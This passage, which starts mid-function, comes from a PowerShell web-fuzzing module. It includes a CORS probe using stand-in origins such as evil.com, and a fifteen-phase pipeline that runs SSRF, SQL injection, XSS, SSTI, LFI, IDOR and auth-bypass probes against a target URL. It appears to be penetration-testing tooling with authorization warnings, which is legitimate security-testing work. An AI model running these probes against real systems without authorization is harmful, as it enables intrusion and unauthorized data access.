            _Write-Anomaly "Auth=[$keys] -> $($resp.StatusCode) [ACCESSIBLE WITHOUT AUTH]"
        }
        if ($validResp -and $resp.BodySize -eq $validResp.BodySize -and $resp.StatusCode -eq $validResp.StatusCode) {
            $isAnomaly = $true
            $keys = [string]::Join(', ', @($authHeaders.Keys))
            _Write-Anomaly "Auth=[$keys] -> Same response as valid auth [BYPASS]"
        }

        $authType = if ($authHeaders.Count -gt 0) {
            $pair = $authHeaders.GetEnumerator() | Select-Object -First 1
            "$($pair.Key): $($pair.Value)"
        } else {
            'No Auth'
        }

        $bodyPreview = $resp.Body.Substring(0, [Math]::Min(300, $resp.Body.Length))
        $results += [PSCustomObject]@{
            AuthType   = $authType
            StatusCode = $resp.StatusCode
            BodySize   = $resp.BodySize
            IsAnomaly  = $isAnomaly
            Body       = $bodyPreview
        }
    }

    _Write-Success "No-Auth probe complete - $($results.Count) auth configurations tested"
    return $results
}

# ──────────────────────────────────────────────────────────────────────────────
# FUNCTION: Invoke-CorsProbe
# ──────────────────────────────────────────────────────────────────────────────

<#
.SYNOPSIS
    Test CORS configuration on endpoints.
.DESCRIPTION
    Sends requests with an arbitrary Origin header and checks for
    Access-Control-Allow-Origin in the response, which would indicate
    a permissive CORS policy.
.PARAMETER Url
    Target URL(s). Accepts a single URL or array.
.PARAMETER Origins
    Array of Origin header values to test.
.PARAMETER Method
    HTTP method (default: GET).
.PARAMETER DelayMs
    Delay between requests (default: 100).
.PARAMETER TimeoutSec
    Per-request timeout (default: 15).
.EXAMPLE
    Invoke-CorsProbe -Url 'https://target.com/api/users' -Origins 'https://evil.com','null'
#>
function Invoke-CorsProbe {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory,Position=0)]
        [string[]]$Url,
        [string[]]$Origins = @('https://evil.com','null','https://attacker.com','http://localhost','https://sub.evil.com'),
        [ValidateSet('GET','POST','PUT','PATCH','DELETE','OPTIONS')]
        [string]$Method = 'GET',
        [ValidateRange(0,5000)]
        [int]$DelayMs = 100,
        [ValidateRange(1,120)]
        [int]$TimeoutSec = 15
    )

    _Write-Info "CORS Probe - $($Url -join ', ') ($Method, delay=${DelayMs}ms)"
    $results = @()

    foreach ($u in $Url) {
        foreach ($origin in $Origins) {
            $headers = "Origin: $origin"
            if ($Method -eq 'OPTIONS') {
                $headers += "`nAccess-Control-Request-Method: GET"
            }
            $resp = _Invoke-Curl -Url $u -Method $Method -Headers $headers -DelayMs $DelayMs -TimeoutSec $TimeoutSec

            $isWildcard = $resp.Headers -match 'Access-Control-Allow-Origin: \*'
            $isEchoed = $resp.Headers -match "Access-Control-Allow-Origin: $([regex]::Escape($origin))"
            $hasCredentials = $resp.Headers -match 'Access-Control-Allow-Credentials: true'

            $isAnomaly = $isWildcard -or ($isEchoed -and $hasCredentials) -or $isEchoed

            if ($isAnomaly) {
                $acao = if ($isWildcard) { '*' } elseif ($isEchoed) { $origin } else { '' }
                _Write-Anomaly "$u [Origin=$origin] ACAO=$acao Credentials=$hasCredentials"
            }

            $acaoLine = if ($resp.Headers -match 'Access-Control-Allow-Origin: (.+)') { $Matches[0] } else { '' }
            $acacLine = if ($resp.Headers -match 'Access-Control-Allow-Credentials: (.+)') { $Matches[0] } else { '' }

            $results += [PSCustomObject]@{
                Url            = $u
                Origin         = $origin
                StatusCode     = $resp.StatusCode
                IsAnomaly      = $isAnomaly
                ACAO           = $acaoLine
                ACAC           = $acacLine
                IsWildcard     = $isWildcard
                IsEchoed       = $isEchoed
                HasCredentials = $hasCredentials
            }
        }
    }

    _Write-Success "CORS probe complete - $($results.Count) origins tested"
    return $results
}

# ──────────────────────────────────────────────────────────────────────────────
# FUNCTION: Invoke-FullFuzzPipeline
# ──────────────────────────────────────────────────────────────────────────────

<#
.SYNOPSIS
    Run all fuzz tests on a target endpoint.
.DESCRIPTION
    Orchestrates execution of all fuzzing functions in sequence on
    a single target URL. Produces a consolidated result object with
    anomalies from each test phase. Respects rate limits and
    allows skipping specific phases.
.PARAMETER BaseUrl
    Base target URL.
.PARAMETER ApiEndpoint
    Specific endpoint path to test (appended to BaseUrl).
.PARAMETER SkipPhases
    Array of phases to skip.
.PARAMETER IdorPattern
    URL pattern with {id} placeholder for IDOR testing.
.PARAMETER JsonTemplate
    JSON body template for field fuzzing.
.PARAMETER SsrfParam
    Parameter name for SSRF testing.
.PARAMETER SqliParam
    Parameter name for SQLi testing.
.PARAMETER XssParam
    Parameter name for XSS testing.
.PARAMETER SstiParam
    Parameter name for SSTI testing.
.PARAMETER LfiParam
    Parameter name for LFI testing.
.PARAMETER CollaboratorUrl
    Collaborator URL for SSRF out-of-band detection.
.PARAMETER ValidAuth
    Valid Authorization header for no-auth comparison.
.PARAMETER AuthCookie
    Valid cookie for authenticated endpoints.
.PARAMETER DelayMs
    Default delay between requests (default: 150).
.PARAMETER TimeoutSec
    Default per-request timeout (default: 15).
.EXAMPLE
    Invoke-FullFuzzPipeline -BaseUrl 'https://target.com' -ApiEndpoint '/api/users'
#>
function Invoke-FullFuzzPipeline {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory,Position=0)]
        [ValidateScript({$_ -match '^https?://'})]
        [string]$BaseUrl,
        [string]$ApiEndpoint = '/api/v1/resource',
        [ValidateSet('params','paths','headers','methods','ct','json','idor','ssrf','sqli','xss','ssti','lfi','ratelimit','noauth','cors')]
        [string[]]$SkipPhases = @(),
        [string]$IdorPattern = '',
        [string]$JsonTemplate = '{"id":1,"name":"test"}',
        [string]$SsrfParam = 'url',
        [string]$SqliParam = 'id',
        [string]$XssParam = 'q',
        [string]$SstiParam = 'name',
        [string]$LfiParam = 'file',
        [string]$CollaboratorUrl = '',
        [string]$ValidAuth = '',
        [string]$AuthCookie = '',
        [ValidateRange(0,5000)]
        [int]$DelayMs = 150,
        [ValidateRange(1,120)]
        [int]$TimeoutSec = 15
    )

    $fullUrl = _Resolve-Url -BaseUrl $BaseUrl -Path $ApiEndpoint
    $startTime = Get-Date
    $results = @{}

    _Write-Info "===== FULL FUZZ PIPELINE ====="
    _Write-Info "Target: $fullUrl"
    _Write-Info "Started: $(_Get-Timestamp)"
    _Write-Warn "This will generate significant traffic. Ensure you have authorization."
    _Write-Warn "Press Ctrl+C at any time to abort."
    Start-Sleep -Seconds 2

    if ('params' -notin $SkipPhases) {
        _Write-Info "`n=== Phase 1/15: Parameter Fuzzing ==="
        $results['params'] = Invoke-ParameterFuzz -Url $fullUrl -DelayMs $DelayMs -TimeoutSec $TimeoutSec
    }

    if ('paths' -notin $SkipPhases) {
        _Write-Info "`n=== Phase 2/15: Path Fuzzing ==="
        $results['paths'] = Invoke-PathFuzz -BaseUrl $BaseUrl -DelayMs $DelayMs -TimeoutSec $TimeoutSec
    }

    if ('headers' -notin $SkipPhases) {
        _Write-Info "`n=== Phase 3/15: Header Fuzzing ==="
        $extraHeaders = @{}
        if ($AuthCookie) { $extraHeaders['Cookie'] = $AuthCookie }
        if ($ValidAuth) { $extraHeaders['Authorization'] = $ValidAuth }
        $results['headers'] = Invoke-HeaderFuzz -Url $fullUrl -BaselineHeaders $extraHeaders -DelayMs $DelayMs -TimeoutSec $TimeoutSec
    }

    if ('methods' -notin $SkipPhases) {
        _Write-Info "`n=== Phase 4/15: Method Brute-Force ==="
        $results['methods'] = Invoke-MethodBrute -Url $fullUrl -DelayMs $DelayMs -TimeoutSec $TimeoutSec -TestOverride
    }

    if ('ct' -notin $SkipPhases) {
        _Write-Info "`n=== Phase 5/15: Content-Type Fuzzing ==="
        $results['content_type'] = Invoke-ContentTypeFuzz -Url $fullUrl -Body $JsonTemplate -DelayMs $DelayMs -TimeoutSec $TimeoutSec
    }

    if ('json' -notin $SkipPhases) {
        _Write-Info "`n=== Phase 6/15: JSON Field Fuzzing ==="
        $results['json_fields'] = Invoke-JsonFieldFuzz -Url $fullUrl -JsonBody $JsonTemplate -DelayMs $DelayMs -TimeoutSec $TimeoutSec
    }

    if ('idor' -notin $SkipPhases -and $IdorPattern) {
        _Write-Info "`n=== Phase 7/15: IDOR Enumeration ==="
        $results['idor'] = Invoke-IdorRange -Url $IdorPattern -DelayMs $DelayMs -TimeoutSec $TimeoutSec
    }

    if ('ssrf' -notin $SkipPhases) {
        _Write-Info "`n=== Phase 8/15: SSRF Probe ==="
        $results['ssrf'] = Invoke-SsrfProbe -Url $fullUrl -Parameter $SsrfParam -CollaboratorUrl $CollaboratorUrl -DelayMs $DelayMs -TimeoutSec $TimeoutSec
    }

    if ('sqli' -notin $SkipPhases) {
        _Write-Info "`n=== Phase 9/15: SQLi Probe ==="
        $results['sqli'] = Invoke-SqliProbe -Url $fullUrl -Parameter $SqliParam -DelayMs $DelayMs -TimeoutSec $TimeoutSec
    }

    if ('xss' -notin $SkipPhases) {
        _Write-Info "`n=== Phase 10/15: XSS Probe ==="
        $results['xss'] = Invoke-XssProbe -Url $fullUrl -Parameter $XssParam -DelayMs $DelayMs -TimeoutSec $TimeoutSec
    }

    if ('ssti' -notin $SkipPhases) {
        _Write-Info "`n=== Phase 11/15: SSTI Probe ==="
        $results['ssti'] = Invoke-SstiProbe -Url $fullUrl -Parameter $SstiParam -DelayMs $DelayMs -TimeoutSec $TimeoutSec
    }

    if ('lfi' -notin $SkipPhases) {
        _Write-Info "`n=== Phase 12/15: LFI Probe ==="
        $results['lfi'] = Invoke-LfiProbe -Url $fullUrl -Parameter $LfiParam -DelayMs $DelayMs -TimeoutSec $TimeoutSec
    }

    if ('ratelimit' -notin $SkipPhases) {
        _Write-Info "`n=== Phase 13/15: Rate Limit Test ==="
        $results['ratelimit'] = Invoke-RateLimitTest -Url $fullUrl -DelayMs $DelayMs -TimeoutSec $TimeoutSec
    }

    if ('noauth' -notin $SkipPhases) {
        _Write-Info "`n=== Phase 14/15: No-Auth Probe ==="
        $results['noauth'] = Invoke-NoAuthProbe -Url $fullUrl -ValidAuthHeader $ValidAuth -DelayMs $DelayMs -TimeoutSec $TimeoutSec
    }

    if ('cors' -notin $SkipPhases) {
        _Write-Info "`n=== Phase 15/15: CORS Probe ==="
        $results['cors'] = Invoke-CorsProbe -Url $fullUrl -DelayMs $DelayMs -TimeoutSec $TimeoutSec
    }

    $elapsed = [math]::Round(((Get-Date) - $startTime).TotalSeconds)

    $allAnomalies = @()
    foreach ($phase in $results.Keys) {
        $phaseResults = $results[$phase]
        if ($phaseResults -is [array]) {
            $anomalies = $phaseResults | Where-Object { $_.IsAnomaly }
            foreach ($a in $anomalies) {
                $allAnomalies += [PSCustomObject]@{
                    Phase  = $phase
                    Detail = $a
                }
            }
        }
    }

    $output = [PSCustomObject]@{
        TargetUrl    = $fullUrl
        StartTime    = $startTime
        EndTime      = Get-Date
        ElapsedSecs  = $elapsed
        PhasesRun    = $results.Keys.Count
        AnomalyCount = $allAnomalies.Count
        Anomalies    = $allAnomalies
        RawResults   = $results
    }

    _Write-Info "`n===== PIPELINE COMPLETE ====="
    _Write-Info "Duration: ${elapsed}s | Phases: $($results.Keys.Count) | Anomalies: $($allAnomalies.Count)"
    return $output
}

# ──────────────────────────────────────────────────────────────────────────────
# FUNCTION: Out-FuzzReport
# ──────────────────────────────────────────────────────────────────────────────

<#
.SYNOPSIS
    Format fuzzing results into a structured text report.
.DESCRIPTION
    Takes results from any fuzzing function and outputs a formatted
    report to the console or a file. Anomalies are highlighted in red
    with context.
.PARAMETER Results
    Array of results from a fuzzing function.
.PARAMETER Path
    Optional path to write report file.
.PARAMETER ShowAll
    Show all results (not just anomalies). Default shows only anomalies.
.PARAMETER Name
    A name/label for this report section.
.EXAMPLE
    $r = Invoke-ParameterFuzz -Url 'https://target.com/api'
    Out-FuzzReport -Results $r -Name 'Parameter Fuzz' -ShowAll
#>
function Out-FuzzReport {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory,Position=0,ValueFromPipeline)]
        [object[]]$Results,
        [string]$Path = '',
        [switch]$ShowAll,
        [string]$Name = 'Fuzzing Report'
    )

    begin {
        $lines = @()
        $lines += '=' * 72
        $lines += " FUZZ REPORT: $Name"
        $lines += " Generated: $(_Get-Timestamp)"
        $lines += '=' * 72
        $lines += ''
    }

    process {
        if ($Results -is [array]) {
            $anomalies = $Results | Where-Object { $_.IsAnomaly }
            $total = $Results.Count

            $lines += " Summary: $total tests, $($anomalies.Count) anomalies"
            $lines += ''

            if ($ShowAll -or $anomalies.Count -eq 0) {
                $lines += ' All Results:'
                $lines += ('-' * 72)
                foreach ($r in $Results) {
                    $flag = if ($r.IsAnomaly) { '[!]' } else { '[ ]' }
                    $propsArray = @()
                    foreach ($prop in $r.PSObject.Properties) {
                        if ($prop.Name -in 'IsAnomaly','Body') { continue }
                        $propsArray += "$($prop.Name)=$($prop.Value)"
                    }
                    $propsStr = $propsArray -join ' | '
                    $lines += " $flag $propsStr"
                }
                $lines += ''
            }

            if ($anomalies.Count -gt 0) {
                $lines += " ANOMALIES ($($anomalies.Count)):"
                $lines += ('-' * 72)
                foreach ($a in $anomalies) {
                    $propsArray = @()
                    foreach ($prop in $a.PSObject.Properties) {
                        if ($prop.Name -in 'IsAnomaly','Body') { continue }
                        $propsArray += "$($prop.Name)=$($prop.Value)"
                    }
                    $propsStr = $propsArray -join ' | '
                    $lines += " [!] $propsStr"
                }
                $lines += ''
            }
        } elseif ($Results -is [PSCustomObject]) {
            $lines += ' Pipeline Report:'
            $lines += ('-' * 72)
            foreach ($prop in $Results.PSObject.Properties) {
                if ($prop.Name -eq 'Anomalies' -and $prop.Value.Count -gt 0) {
                    $lines += " $($prop.Name): $($prop.Value.Count) total"
                    foreach ($a in $prop.Value) {
                        $phase = $a.Phase
                        $detail = $a.Detail
                        $subProps = @()
                        foreach ($dprop in $detail.PSObject.Properties) {
                            if ($dprop.Name -in 'IsAnomaly','Body') { continue }
                            $subProps += "$($dprop.Name)=$($dprop.Value)"
                        }
                        $lines += "   [Phase: $phase] $($subProps -join ' | ')"
                    }
                } elseif ($prop.Name -notin 'RawResults','Anomalies') {
                    $lines += " $($prop.Name): $($prop.Value)"
                }
            }
        }

        $lines += ''
        $lines += '=' * 72
    }

    end {
        $reportText = $lines -join "`n"

        foreach ($line in $lines) {
            if ($line -match '^ \[!\]') {
                Write-Host $line -ForegroundColor Red
            } elseif ($line -match '^ ANOMALIES|^ Summary') {
                Write-Host $line -ForegroundColor Yellow
            } elseif ($line -match '^ FUZZ REPORT|^=') {
                Write-Host $line -ForegroundColor Cyan
            } else {
                Write-Host $line
            }
        }

        if ($Path) {
            $reportText | Out-File -LiteralPath $Path -Encoding utf8
            _Write-Info "Report written to $Path"
        }

        return $reportText
    }
}

# ──────────────────────────────────────────────────────────────────────────────
# EXPORT
# ──────────────────────────────────────────────────────────────────────────────

Export-ModuleMember -Function @(
    'Invoke-ParameterFuzz',
    'Invoke-PathFuzz',
    'Invoke-HeaderFuzz',
    'Invoke-MethodBrute',
    'Invoke-ContentTypeFuzz',
    'Invoke-JsonFieldFuzz',
    'Invoke-IdorRange',
    'Invoke-SsrfProbe',
    'Invoke-SqliProbe',
    'Invoke-XssProbe',
    'Invoke-SstiProbe',
    'Invoke-LfiProbe',
    'Invoke-RateLimitTest',
    'Invoke-NoAuthProbe',
    'Invoke-CorsProbe',
    'Invoke-FullFuzzPipeline',
    'Out-FuzzReport',
    'Get-Wordlist'
)

Write-Host 'Fuzzer Toolkit loaded. Use Get-Command -Module FuzzerToolkit to list functions.' -ForegroundColor Green
Write-Host 'WARNING: Only use against authorized targets. Respect rate limits.' -ForegroundColor Yellow
